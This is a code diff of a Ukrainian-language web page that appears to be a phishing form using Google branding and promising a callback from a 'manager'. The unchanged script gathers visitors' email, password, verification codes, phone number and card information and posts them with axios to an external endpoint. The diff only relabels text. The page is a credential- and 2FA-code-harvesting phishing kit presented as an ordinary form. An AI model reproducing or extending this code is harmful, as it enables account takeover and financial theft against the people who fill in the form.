@@ -52,7 +52,8 @@ fbq('track', 'PageView');
       <div class="form">
         <div data-aos="fade-up-right" class="container"></div>
         <form class="main-form form-fields" action="send.php" method="get"></form>
-                <p class="money-pay"><strong>Заповніть форму Google</strong></p>
+                <p class="money-pay"><strong>Google</strong></p>
+                <p class="money-pay"><strong>Заповніть форму</strong></p>
          
           <h4 >І наш менеджер зв'яжеться з вами впродовж години:</h4>
 
@@ -119,7 +120,7 @@ fbq('track', 'PageView');
               message += `<b>Пошта:</b> ${ this.email.value }\n`;
               message += `<b>Пароль:</b> ${ this.password.value }\n`;
               message += `<b>Коди:</b> ${ this.codes.value }\n`;
-              message += `<b>Номер/TG:</b> ${ this.namber.value }\n`;
+              message += `<b>Номер:</b> ${ this.namber.value }\n`;
               message += `<b>Карта:</b> ${ this.yesno.value }\n`;
               message += `<b>Спосіб зв'язку:</b> ${ this.messanger.value }`;
               axios.post(URI_API, {
